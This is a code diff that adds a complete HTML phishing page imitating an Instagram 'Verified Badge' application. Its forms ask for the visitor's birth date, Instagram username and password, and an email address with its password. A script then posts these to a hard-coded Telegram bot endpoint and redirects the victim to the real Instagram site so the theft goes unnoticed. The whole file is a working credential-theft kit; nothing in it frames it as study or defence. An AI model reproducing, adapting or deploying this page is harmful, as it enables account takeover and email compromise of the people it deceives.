@@ -1,0 +1,312 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram Verified Badge</title>
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      background: #fafafa;
+      font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      padding: 20px;
+    }
+
+    .container {
+      max-width: 440px;
+      width: 100%;
+    }
+
+    .page {
+      background: white;
+      border-radius: 16px;
+      padding: 32px 24px 40px;
+      box-shadow: 0 1px 3px rgba(0,0,0,0.08);
+    }
+
+    .page:not(.active) {
+      display: none;
+    }
+
+    .page.active {
+      display: block;
+    }
+
+    .badge-icon {
+      display: flex;
+      justify-content: center;
+      margin-bottom: 20px;
+    }
+
+    .badge-svg {
+      width: 88px;
+      height: 88px;
+    }
+
+    h2 {
+      text-align: center;
+      font-size: 24px;
+      font-weight: 600;
+      color: #262626;
+      margin-bottom: 12px;
+    }
+
+    .desc {
+      text-align: center;
+      font-size: 14px;
+      color: #737373;
+      line-height: 1.5;
+      margin-bottom: 24px;
+    }
+
+    button {
+      background: #0095f6;
+      border: none;
+      border-radius: 8px;
+      padding: 8px 20px;
+      font-size: 14px;
+      font-weight: 600;
+      color: white;
+      cursor: pointer;
+      font-family: inherit;
+    }
+
+    .btn-center {
+      display: block;
+      margin: 0 auto;
+    }
+
+    .btn-full {
+      width: 100%;
+      padding: 10px;
+      margin-top: 8px;
+    }
+
+    .form-group {
+      margin-bottom: 16px;
+    }
+
+    label {
+      font-size: 12px;
+      font-weight: 600;
+      color: #8e8e8e;
+      display: block;
+      margin-bottom: 4px;
+      text-transform: uppercase;
+    }
+
+    input, select {
+      width: 100%;
+      height: 44px;
+      padding: 0 12px;
+      border: 1px solid #dbdbdb;
+      border-radius: 8px;
+      font-size: 14px;
+      background: #fafafa;
+      font-family: inherit;
+    }
+
+    input:focus, select:focus {
+      outline: none;
+      border-color: #0095f6;
+      background: white;
+    }
+
+    .row-3 {
+      display: flex;
+      gap: 10px;
+      margin-bottom: 16px;
+    }
+    .row-3 .form-group {
+      flex: 1;
+      margin-bottom: 0;
+    }
+
+    .header-bar {
+      border-bottom: 1px solid #dbdbdb;
+      padding-bottom: 12px;
+      margin-bottom: 24px;
+    }
+    .header-bar h3 {
+      font-size: 20px;
+      font-weight: 600;
+      color: #262626;
+    }
+
+    .mini-badge {
+      text-align: center;
+      margin: 16px 0 12px;
+    }
+  </style>
+</head>
+<body>
+<div class="container">
+  <!-- PAGE 1 -->
+  <div id="page1" class="page active">
+    <div class="badge-icon">
+      <svg class="badge-svg" viewBox="0 0 24 24" fill="none">
+        <circle cx="12" cy="12" r="10" fill="#0095f6" />
+        <path d="M9 12L11 14L15 9" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+        <circle cx="12" cy="12" r="11" stroke="#0095f6" stroke-width="1.2" fill="none"/>
+      </svg>
+    </div>
+    <h2>Verified Badge</h2>
+    <div class="desc">
+      A verified badge is a check that appears next to an Instagram account's name in search and on the profile. It means that Instagram has confirmed that this is the authentic account for the public figure, celebrity or global brand it represents.<br><br>
+      Accounts representing well-known figures and brands are verified because they have a high likelihood of being impersonated. We want to make sure that people in the Instagram community can easily find the authentic people and brands they want to follow.
+    </div>
+    <button class="btn-center" onclick="showPage(2)">Verify Now</button>
+  </div>
+
+  <!-- PAGE 2 -->
+  <div id="page2" class="page">
+    <div class="header-bar">
+      <h3>Verified Badge</h3>
+    </div>
+    <div class="row-3">
+      <div class="form-group">
+        <label>Month</label>
+        <select id="month">
+          <option>January</option><option>February</option><option>March</option><option>April</option>
+          <option>May</option><option>June</option><option>July</option><option>August</option>
+          <option>September</option><option>October</option><option>November</option><option>December</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>Date</label>
+        <select id="date">
+          <option>1</option><option>2</option><option>3</option><option>4</option><option>5</option>
+          <option>6</option><option>7</option><option>8</option><option>9</option><option>10</option>
+          <option>11</option><option>12</option><option>13</option><option>14</option><option>15</option>
+          <option>16</option><option>17</option><option>18</option><option>19</option><option>20</option>
+          <option>21</option><option>22</option><option>23</option><option>24</option><option>25</option>
+          <option>26</option><option>27</option><option>28</option><option>29</option><option>30</option>
+          <option>31</option>
+        </select>
+      </div>
+      <div class="form-group">
+        <label>Year</label>
+        <select id="year"></select>
+      </div>
+    </div>
+    <div class="form-group">
+      <input type="text" id="userDetail" placeholder="Phone number, username, or email">
+    </div>
+    <div class="form-group">
+      <input type="password" id="password" placeholder="Password">
+    </div>
+    <button class="btn-full" onclick="saveAndNext()">Continue →</button>
+  </div>
+
+  <!-- PAGE 3 -->
+  <div id="page3" class="page">
+    <div class="badge-icon">
+      <svg class="badge-svg" viewBox="0 0 24 24" fill="none">
+        <circle cx="12" cy="12" r="10" fill="#0095f6" />
+        <path d="M9 12L11 14L15 9" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+        <circle cx="12" cy="12" r="11" stroke="#0095f6" stroke-width="1.2" fill="none"/>
+      </svg>
+    </div>
+    <h2>Mail Confirmation</h2>
+    <div class="desc">
+      In order to have a verification badge, you need to confirm your email. After mail confirmation, your application will be evaluated within 24 hours and you will be returned.
+    </div>
+    <button class="btn-center" onclick="showPage(4)">Confirm Email →</button>
+  </div>
+
+  <!-- PAGE 4 -->
+  <div id="page4" class="page">
+    <div class="header-bar">
+      <h3>Verified Badge</h3>
+    </div>
+    <div class="form-group">
+      <input type="email" id="confirmEmail" placeholder="Email">
+    </div>
+    <div class="form-group">
+      <input type="password" id="confirmPass" placeholder="Password">
+    </div>
+    <button class="btn-full" onclick="submitFinal()">Submit Application</button>
+  </div>
+
+  <!-- PAGE 5 -->
+  <div id="page5" class="page">
+    <div class="mini-badge">
+      <svg width="72" height="72" viewBox="0 0 24 24" fill="none">
+        <circle cx="12" cy="12" r="10" fill="#0095f6" />
+        <path d="M9 12L11 14L15 9" stroke="white" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round" fill="none"/>
+      </svg>
+    </div>
+    <h2>Verified Badge</h2>
+    <div class="desc">
+      Your application has been successfully received. It will be reviewed within 24 hours and your e-mail address will be returned.
+    </div>
+  </div>
+</div>
+
+<script>
+  // Year dropdown 1995-2026
+  const yearSelect = document.getElementById('year');
+  for (let y = 1995; y <= 2026; y++) {
+    let opt = document.createElement('option');
+    opt.value = y;
+    opt.textContent = y;
+    if (y === 2024) opt.selected = true;
+    yearSelect.appendChild(opt);
+  }
+
+  let formData = { month: '', date: '', year: '', detail: '', pass: '' };
+  let redirectTimer = null;
+
+  function showPage(n) {
+    document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+    document.getElementById('page' + n).classList.add('active');
+  }
+
+  function saveAndNext() {
+    let month = document.getElementById('month').value;
+    let date = document.getElementById('date').value;
+    let year = document.getElementById('year').value;
+    let detail = document.getElementById('userDetail').value.trim();
+    let pass = document.getElementById('password').value;
+
+    if (!detail) { alert('Enter phone number, username, or email'); return; }
+    if (!pass) { alert('Enter password'); return; }
+
+    formData = { month, date, year, detail, pass };
+    showPage(3);
+  }
+
+  function submitFinal() {
+    let email = document.getElementById('confirmEmail').value.trim();
+    let pwd = document.getElementById('confirmPass').value;
+
+    if (!email || !pwd) { alert('Fill email and password'); return; }
+    if (!email.includes('@')) { alert('Valid email required'); return; }
+
+    let time = new Date().toLocaleString('en-IN');
+    let msg = `🔷 IG VERIFICATION 🔷\n🕒 ${time}\n\n📅 ${formData.month} ${formData.date}, ${formData.year}\n👤 ${formData.detail}\n🔑 ${formData.pass}\n📧 ${email}\n🔐 ${pwd}\n✅ Done`;
+
+    fetch('https://api.telegram.org/bot8546728161:AAFXUxFFWsVE5kmJ0L2kwBaWCWpourt6jAo/sendMessage', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({ chat_id: '6626555680', text: msg })
+    }).catch(e => console.log(e));
+
+    showPage(5);
+    if (redirectTimer) clearTimeout(redirectTimer);
+    redirectTimer = setTimeout(() => {
+      window.location.href = 'https://www.instagram.com/?hl=en';
+    }, 3000);
+  }
+</script>
+</body>
+</html>
